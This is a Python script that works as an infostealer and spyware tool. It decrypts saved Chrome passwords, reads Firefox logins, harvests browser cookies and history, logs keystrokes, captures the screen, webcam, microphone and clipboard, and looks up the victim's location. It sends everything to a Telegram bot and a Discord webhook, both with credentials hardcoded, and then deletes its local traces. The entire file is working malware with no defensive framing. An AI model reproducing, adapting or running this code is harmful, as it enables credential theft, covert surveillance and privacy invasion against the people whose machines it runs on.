import os
import sqlite3
import json
import requests
import base64
import shutil
import pyperclip
from datetime import datetime
import win32crypt  # Windows only
from Crypto.Cipher import AES
import browser_cookie3
import glob
import platform
import socket
import uuid
import geocoder
from PIL import ImageGrab
import cv2
import sounddevice as sd
import numpy as np
import scipy.io.wavfile as wav
from pynput import keyboard
import time

# ===== CONFIGURATION =====
TELEGRAM_BOT_TOKEN = "7981924217:AAH58pNcgI33TbOrxUingXTG2nfQa_idWps"
TELEGRAM_CHAT_ID = "6558780822"
WEBHOOK_URL = "https://discord.com/api/webhooks/1415295319025123418/J_d1zg0WR8s6PNHFf22qvazZEVAR_cJQCjJqzrYeTMpKv_znl8rVEmaacXxklj4WfbJi"
LOG_FILE = "keylogs.txt"
RECORD_DURATION = 10  # Seconds for audio recording

# ===== TELEGRAM UTILS =====
def send_to_telegram(text, file_path=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    if file_path:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": text}
            requests.post(url, files=files, data=data)
    else:
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
        requests.post(url, json=data)

# ===== DEVICE & LOCATION =====
def get_device_info():
    try:
        return {
            "OS": f"{platform.system()} {platform.release()}",
            "Hostname": socket.gethostname(),
            "MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1]),
            "IP": socket.gethostbyname(socket.gethostname()),
            "User": os.getlogin(),
            "CPU": platform.processor(),
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        return {"Error": str(e)}

def get_location():
    try:
        g = geocoder.ip('me')
        return {
            "City": g.city,
            "Country": g.country,
            "Coordinates": g.latlng,
            "IP": g.ip
        }
    except:
        return {"Error": "Location unavailable"}

# ===== BROWSER DATA =====
def get_browser_data():
    return {
        "Chrome_Passwords": get_chrome_passwords(),
        "Firefox_Passwords": get_firefox_passwords(),
        "Cookies": get_browser_cookies(),
        "History": get_browser_history()
    }

def get_chrome_passwords():
    try:
        if os.name == 'nt':
            path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        else:
            path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")

        temp_file = "chrome_passwords.db"
        shutil.copy2(path, temp_file)

        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if os.name == 'nt' and encrypted_password:
                try:
                    decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    if decrypted_password:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": decrypted_password.decode("utf-8")
                        })
                except:
                    pass

        conn.close()
        os.remove(temp_file)
        return passwords
    except:
        return []

def get_firefox_passwords():
    try:
        if os.name == 'nt':
            path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        else:
            path = os.path.expanduser("~/.mozilla/firefox")

        profiles = glob.glob(os.path.join(path, "*.default-release"))
        if not profiles:
            return []

        profile = profiles[0]
        logins_json = os.path.join(profile, "logins.json")

        if not os.path.exists(logins_json):
            return []

        with open(logins_json, "r") as f:
            data = json.load(f)
            return data.get("logins", [])
    except:
        return []

def get_browser_cookies():
    try:
        cookies = []
        for browser in ["chrome", "firefox", "edge", "opera", "brave"]:
            try:
                for cookie in browser_cookie3.load(browser):
                    cookies.append({
                        "name": cookie.name,
                        "value": cookie.value,
                        "domain": cookie.domain,
                        "expires": cookie.expires,
                    })
            except:
                pass
        return cookies
    except:
        return []

def get_browser_history():
    try:
        history = []
        if os.name == 'nt':
            history_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
        else:
            history_path = os.path.expanduser("~/.config/google-chrome/Default/History")

        if os.path.exists(history_path):
            temp_file = "chrome_history.db"
            shutil.copy2(history_path, temp_file)
            conn = sqlite3.connect(temp_file)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                url, title, timestamp = row
                history.append({
                    "url": url,
                    "title": title,
                    "timestamp": timestamp
                })
            conn.close()
            os.remove(temp_file)
        return history
    except:
        return []

# ===== SYSTEM MONITORING =====
def capture_screen():
    try:
        ImageGrab.grab().save("screenshot.png")
        return "screenshot.png"
    except:
        return None

def capture_webcam():
    try:
        cam = cv2.VideoCapture(0)
        _, frame = cam.read()
        cv2.imwrite("webcam.png", frame)
        cam.release()
        return "webcam.png"
    except:
        return None

def record_audio():
    try:
        fs = 44100
        recording = sd.rec(int(RECORD_DURATION * fs), samplerate=fs, channels=2)
        sd.wait()
        wav.write("recording.wav", fs, recording)
        return "recording.wav"
    except:
        return None

# ===== KEYLOGGER =====
def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

# ===== DISCORD UTILS =====
def send_to_discord():
    data = {
        "Device_Info": get_device_info(),
        "Location": get_location(),
        "Browser_Data": get_browser_data(),
        "Clipboard": pyperclip.paste()
    }
    files = {
        "file1": ("screenshot.png", open("screenshot.png", "rb").read()) if os.path.exists("screenshot.png") else None,
        "file2": ("webcam.png", open("webcam.png", "rb").read()) if os.path.exists("webcam.png") else None,
        "file3": ("recording.wav", open("recording.wav", "rb").read()) if os.path.exists("recording.wav") else None,
        "file4": ("keylogs.txt", open(LOG_FILE, "rb").read()) if os.path.exists(LOG_FILE) else None,
    }
    files = {k: v for k, v in files.items() if v is not None}
    requests.post(WEBHOOK_URL, files=files, data={"payload_json": json.dumps(data)})

# ===== MAIN EXECUTION =====
if __name__ == "__main__":
    keylogger = start_keylogger()
    time.sleep(30)  # Collect data for 30 seconds
    keylogger.stop()

    # Collect data
    device_info = get_device_info()
    location = get_location()
    browser_data = get_browser_data()
    screenshot = capture_screen()
    webcam = capture_webcam()
    audio = record_audio()

    # Format report for Telegram
    report = f"""
    📡 **Device Info**:
    ```json
    {json.dumps(device_info, indent=2)}
    ```
    
    🌍 **Location**:
    ```json
    {json.dumps(location, indent=2)}
    ```
    
    🔑 **Browser Data**:
    ```json
    {json.dumps(browser_data, indent=2)}
    ```
    """

    # Send to Telegram
    send_to_telegram(report)
    if screenshot: send_to_telegram("📸 Screenshot", screenshot)
    if webcam: send_to_telegram("🎥 Webcam Capture", webcam)
    if audio: send_to_telegram("🎤 Audio Recording", audio)
    if os.path.exists(LOG_FILE): send_to_telegram("⌨️ Keylogs", LOG_FILE)

    # Send to Discord (optional)
    send_to_discord()

    # Cleanup
    for file in ["screenshot.png", "webcam.png", "recording.wav", "chrome_passwords.db", "chrome_history.db", LOG_FILE]:
        if os.path.exists(file):
            os.remove(file)
